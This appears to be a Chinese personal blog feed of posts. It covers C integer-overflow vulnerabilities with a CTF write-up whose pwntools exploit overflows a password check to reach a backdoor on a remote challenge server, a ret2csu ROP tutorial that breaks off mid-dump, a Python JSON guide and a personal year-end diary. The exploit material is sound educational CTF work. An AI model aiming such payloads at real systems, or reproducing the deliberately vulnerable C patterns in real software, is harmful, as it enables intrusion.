class="keyword">int</span> <span class="keyword">size_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> *dest, <span class="keyword">const</span> <span class="keyword">void</span> *src, <span class="keyword">size_t</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strncpy</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src, <span class="keyword">size_t</span> n)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="整数溢出示例"><a href="#整数溢出示例" class="headerlink" title="整数溢出示例"></a>整数溢出示例</h2><p>下面用3个示例来演示：</p><h3 id="示例一：整数转换："><a href="#示例一：整数转换：" class="headerlink" title="示例一：整数转换："></a>示例一：整数转换：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> buf[<span class="number">80</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = read_int_from_network();</span><br><span class="line">    <span class="keyword">char</span> *p = read_string_from_network();</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">80</span>) &#123;</span><br><span class="line">        error(<span class="string">&quot;length too large: bad dog, no cookie for you!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, p, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里，如果给<code>len</code>赋值一个负数，就可以绕过if判断，但是到memcpy时，因为第三个参数是<code>size_t</code>类型，负数的len会被认为是一个很大的正数，从而复制大量内容到buf，导致缓存区溢出。</p><h3 id="示例二：回绕和溢出："><a href="#示例二：回绕和溢出：" class="headerlink" title="示例二：回绕和溢出："></a>示例二：回绕和溢出：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="comment">// int len;</span></span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">    len = read_int_from_network();</span><br><span class="line">    buf = <span class="built_in">malloc</span>(len + <span class="number">5</span>);</span><br><span class="line">    read(fd, buf, len);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相较于上一个例子，这个例子避开来缓冲区溢出的问题，但是如果len很大时，len+5会回绕，比如，若是<code>len = 0xFFFFFFFF</code>，<code>len + 5 = 0x00000004</code>，这时只malloc了4个字节，然而之后会read大量数据，缓冲区溢出也会发生。</p><h3 id="示例三：截断："><a href="#示例三：截断：" class="headerlink" title="示例三：截断："></a>示例三：截断：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> total;</span><br><span class="line">    total = <span class="built_in">strlen</span>(argv[<span class="number">1</span>]) + <span class="built_in">strlen</span>(argv[<span class="number">2</span>]) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">char</span> *buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(total);</span><br><span class="line">    <span class="built_in">strcpy</span>(buf, argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">strcat</span>(buf, argv[<span class="number">2</span>]);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个例子计算了输入参数的长度为total，程序分配了内存来存拼接后的字符串。这里total的类型为<code>unsigned short int</code>，如果攻击者提供的两个字符串总长度无法用total表示，则会发生截断，从而导致后面的缓冲区溢出。</p><h3 id="示例四：功放世界：int-overflow"><a href="#示例四：功放世界：int-overflow" class="headerlink" title="示例四：功放世界：int_overflow"></a>示例四：功放世界：int_overflow</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ file int_overflow </span><br><span class="line">int_overflow: ELF <span class="number">32</span>-bit LSB executable, Intel <span class="number">80386</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib/ld-linux.so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, <span class="keyword">not</span> stripped</span><br><span class="line">yutao@pwnbaby:~/Desktop$ checksec int_overflow</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/int_overflow&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>关键函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-228h]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+200h] [ebp-28h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your username:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);<span class="comment">//0x19u代表无符号 ，uname_max = 0x19</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your passwd:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);            <span class="comment">//pwd_max = 0x199u 远大于下面的 v3</span></span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"><span class="comment">//8bit无符号整数，最大255</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);<span class="comment">//v3 == pwd的长度</span></span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line"><span class="comment">//dest_stack_size==0xb</span></span><br><span class="line"><span class="comment">//s_stack_size(max_passwd_stack_size)==0x200</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v3需要在4到8之间，可以转变为260-264截断，这里的payload的长度为262.</p><p>有后门函数。</p><p>payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io  = process(&quot;./int_overflow&quot;)</span></span><br><span class="line">io  = remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">47612</span>)</span><br><span class="line">back_door_addr = <span class="number">0x08048694</span> </span><br><span class="line">io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;username:&quot;</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x14</span> + <span class="number">4</span> ) + p32(back_door_addr) + <span class="string">&#x27;a&#x27;</span>*<span class="number">233</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;passwd:&quot;</span>, payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop$ python 1.py </span><br><span class="line">[+] Opening connection to 111.200.241.244 on port 47612: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">Success</span><br><span class="line">cyberpeace&#123;570351d22dfa4892efd56550fe59aa63&#125;</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$ </span><br><span class="line">[*] Closed connection to 111.200.241.244 port 47612</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;整数溢出介绍&quot;&gt;&lt;a href=&quot;#整数溢出介绍&quot; class=&quot;headerlink&quot; title=&quot;整数溢出介绍&quot;&gt;&lt;/a&gt;整数溢出介绍&lt;/h2&gt;&lt;p&gt;C语言中整数的分类及各自的大小范围：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;t</summary>
      
    
    
    
    
    <category term="PWN" scheme="http://example.com/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>JSON相关</title>
    <link href="http://example.com/2021/02/27/json%E7%9B%B8%E5%85%B3/"/>
    <id>http://example.com/2021/02/27/json%E7%9B%B8%E5%85%B3/</id>
    <published>2021-02-27T09:57:36.000Z</published>
    <updated>2021-06-01T16:13:35.310Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-JSON的两种结构"><a href="#1-JSON的两种结构" class="headerlink" title="1. JSON的两种结构"></a>1. JSON的两种结构</h2><p>两种结构分别为：对象，数组。</p><h3 id="对象结构"><a href="#对象结构" class="headerlink" title="对象结构"></a>对象结构</h3><p>这种结构以大括号开始和结束，中间有多个以逗号分隔的键值对构成，键值对由冒号分隔。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">key:value,</span><br><span class="line">key2:value2,</span><br><span class="line">key3:value3,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的键为字符串，而值可以是字符串，数值，true，false，null，对象或数组。</p><h3 id="数组结构"><a href="#数组结构" class="headerlink" title="数组结构"></a>数组结构</h3><p>数组结构如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;键名1&quot;</span>:值<span class="number">1</span>,</span><br><span class="line">        <span class="attr">&quot;键名2&quot;</span>:值<span class="number">2</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="attr">&quot;键名3&quot;</span>:值<span class="number">3</span>,</span><br><span class="line">        <span class="attr">&quot;键名4&quot;</span>:值<span class="number">4</span></span><br><span class="line">    &#125;,</span><br><span class="line">    ……</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="2-python中JSON模块"><a href="#2-python中JSON模块" class="headerlink" title="2. python中JSON模块"></a>2. python中JSON模块</h2><p>四个方法：</p><p>dumps，dump，loads，load</p><ul><li>dump的功能就是把<strong>Python对象</strong>encode为<strong>json对象</strong>，一个编码过程。 注意json模块提供了json.dumps和json.dump方法，区别是<strong>dump直接到文件</strong>，而<strong>dumps到一个字符串</strong>，这里的s可以理解为string。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dumps方法</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data = [&#123; <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;b&#x27;</span>:(<span class="number">2</span>, <span class="number">4</span>), <span class="string">&#x27;c&#x27;</span>:<span class="number">3.0</span> &#125;]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;DATA:&#x27;</span>, <span class="built_in">repr</span>(data), <span class="built_in">type</span>(data)) </span><br><span class="line"></span><br><span class="line">data_string = json.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;JSON:&#x27;</span>, data_string, <span class="built_in">type</span>(data_string))</span><br></pre></td></tr></table></figure><ul><li>dump方法不仅可以将python对象编码为string，还可写入文件。但是不能把Python对象直接写入文件。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#dump方法</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">data = [ &#123; <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;b&#x27;</span>:(<span class="number">2</span>, <span class="number">4</span>), <span class="string">&#x27;c&#x27;</span>:<span class="number">3.0</span> &#125; ]</span><br><span class="line"> </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.json&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    json.dump(data,fp)</span><br></pre></td></tr></table></figure><ul><li>loads方法可以将JSON对象decode为python可以识别是对象，这是基于string的，如果是文件，可以用json.load方法。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-JSON的两种结构&quot;&gt;&lt;a href=&quot;#1-JSON的两种结构&quot; class=&quot;headerlink&quot; title=&quot;1. JSON的两种结构&quot;&gt;&lt;/a&gt;1. JSON的两种结构&lt;/h2&gt;&lt;p&gt;两种结构分别为：对象，数组。&lt;/p&gt;
&lt;h3 id=&quot;对象结构&quot;</summary>
      
    
    
    
    
    <category term="Python" scheme="http://example.com/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>2020年都干了啥</title>
    <link href="http://example.com/2021/02/12/2020%E5%B9%B4%E9%83%BD%E5%B9%B2%E4%BA%86%E5%95%A5/"/>
    <id>http://example.com/2021/02/12/2020%E5%B9%B4%E9%83%BD%E5%B9%B2%E4%BA%86%E5%95%A5/</id>
    <published>2021-02-11T16:00:00.000Z</published>
    <updated>2021-06-01T16:09:34.635Z</updated>
    
    <content type="html"><![CDATA[<p>​        写这篇年终总结的时候2021已经过去1/10了，正好大年初一，也闲着，把这篇总结写下吧。</p><p>​        年初疫情爆发，原本要返校补课结果全部改为线上课，质量差的一批，各种浪费时间，但是对我还好吧，可以自己做题看自己想看的网课，学校的课挂着就完了，反正授课质量也就那样。之后过了好一段时间，可以去学校复习了，然后教育局又说说高考推迟了一个月，有好有坏吧。到了高考前，也是各种事情，体检啊乱七八糟的，就是可惜这届高三成人礼没有搞，正好也不用那么尬。</p><p>​        之后的几天高考，考的一塌糊涂，数学考的lj的一批，相比平时能低二三十分，多复习了一个月结果就考了这么个鸟样，唉，没办法，就认命呗，也不可能说什么再来一年了。之前想考的西电啊、南邮啊、成信大啊之类的都去不了了。</p><p>​        填志愿的时候没有写提前批，要不然的话兰大的计算机应该也可以去，大不了滑到一批也可。后来查了好多学校，有的是地方不喜欢，有的听说学校试宿舍不好，等等，最终写了武工大后来听舍友说在他们那里西邮比武工大高？？？黑人问号。。既来之则安之吧。</p><p>​        图书馆去了两次，没意思，人太多还不如去教室自习。</p><p>​        学校的课也不算太紧，就是计院还要有周考就离谱，关键还不给解析和答案，那我考个鸟？？高数老师还是挺好的，宁小青yyds！！听说下学期要换高数老师，这？？？</p><p>​        再后来，就考试、放假，到家后，也就是1.1号，《CTF权威指南PWN篇》这个新书出了，立马入手了，讲的是真不错，之后的两个月就练车和学PWN一起在搞，知识点还没学完，堆还没看，做了一些PWN的题目，写了一些wp，感觉算是刚刚入门吧，路还很长，慢慢走。听说《reserve篇》已经在写了，希望在出来之前把pwn的知识点学完吧。</p><p>​        2020就这么过去了，还记得当时上小学的时候，学校发了个社保卡吧，好像叫社保卡，记得很清楚，绿色的卡片，上面写的有效截止日期正好是2020年，当时我就在算，刚刚好是我上大学的那一年，在幻想2020年会发生什么，当时的社会会怎样，科学技术水平又会怎样……</p><p>​        第一次写年记，怎么说呢，这些年遗憾很多，但是后面的路还很长，不管怎样，2021还要继续努力吖！</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​        写这篇年终总结的时候2021已经过去1/10了，正好大年初一，也闲着，把这篇总结写下吧。&lt;/p&gt;
&lt;p&gt;​        年初疫情爆发，原本要返校补课结果全部改为线上课，质量差的一批，各种浪费时间，但是对我还好吧，可以自己做题看自己想看的网课，学校的课挂着</summary>
      
    
    
    
    
    <category term="Life" scheme="http://example.com/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>Ret2csu</title>
    <link href="http://example.com/2021/02/10/ret2csu/"/>
    <id>http://example.com/2021/02/10/ret2csu/</id>
    <published>2021-02-09T16:00:00.000Z</published>
    <updated>2021-06-01T16:13:03.503Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>x64中，函数的前6个参数是通过寄存器传参的（ 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9），但是大多数情况下，我们很难找到每个寄存器对应的gadgets。这时，我们可以利用x64下的_libc_csu_init中的gadgets。这个函数时用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定存在。不同版本的这个函数有一定的区别。先来看一下这个函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16o</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure><p>在这里我们可以利用以下几点：</p><ul><li><p>从0x40061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx，rbp，r12，r13，r14，r15寄存器</p></li><li><p>从0x400600到0x400609，可以将r13赋值给rdx，将r14赋值给rsi，将r15赋值给edi（虽然这里赋值给edi，但其实此时rdi的高32位寄存器为0，所以我们其实只能控制低32位），而上述的3个寄存器其实就是x64函数调用时用到的前三个寄存器。<strong>此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数</strong>，比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br></pre></td></tr></table></figure></li><li><p>从0x40060D到0x400614，可以控制rbx与rbp之间的关系为：rbx + 1 = rbp，这样就不会执行loc_400600，进而执行下面的汇编代码，这里我们可以简单的设置rbx=0，rbp=1。</p></li></ul><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>下面要用到的示例文件地址：<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init/hitcon-level5</a></p><p>源自蒸米的一步一步学 ROP 之 linux_x64 篇中 level5。</p><p>首先看下保护：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">yutao@pwnbaby:~/Desktop/hitcon-level5$ checksec level5</span><br><span class="line">[*] <span class="string">&#x27;/home/yutao/Desktop/hitcon-level5/level5&#x27;</span></span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>64位，开了堆栈不可执行。</p><p>发现了一个栈溢出的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 24</span><br><span class="line">00:0000│ rsp  0x7fffffffdec8 —▸ 0x400584 (vulnerable_function+30) ◂— nop    </span><br><span class="line">01:0008│ rsi  0x7fffffffded0 ◂— &#x27;12345678\n&#x27;</span><br><span class="line">02:0010│      0x7fffffffded8 ◂— 0xa /* &#x27;\n&#x27; */</span><br><span class="line">03:0018│      0x7fffffffdee0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">09:0048│      0x7fffffffdf10 ◂— 9 /* &#x27;\t&#x27; */</span><br><span class="line">0a:0050│      0x7fffffffdf18 —▸ 0x7ffff7dd5660 (dl_main) ◂— push   rbp</span><br><span class="line">0b:0058│      0x7fffffffdf20 —▸ 0x7fffffffdf88 —▸ 0x7fffffffe058 —▸ 0x7fffffffe386 ◂— &#x27;/home/yutao/Desktop/hitcon-level5/level5&#x27;</span><br><span class="line">0c:0060│      0x7fffffffdf28 ◂— 0x1</span><br><span class="line">... ↓</span><br><span class="line">0e:0070│      0x7fffffffdf38 —▸ 0x40060d (__libc_csu_init+77) ◂— add    rbx, 1</span><br><span class="line">0f:0078│      0x7fffffffdf40 ◂— 0x0</span><br><span class="line">10:0080│      0x7fffffffdf48 —▸ 0x7ffff7ffe170 ◂— 0x0</span><br><span class="line">11:0088│ rbp  0x7fffffffdf50 —▸ 0x7fffffffdf70 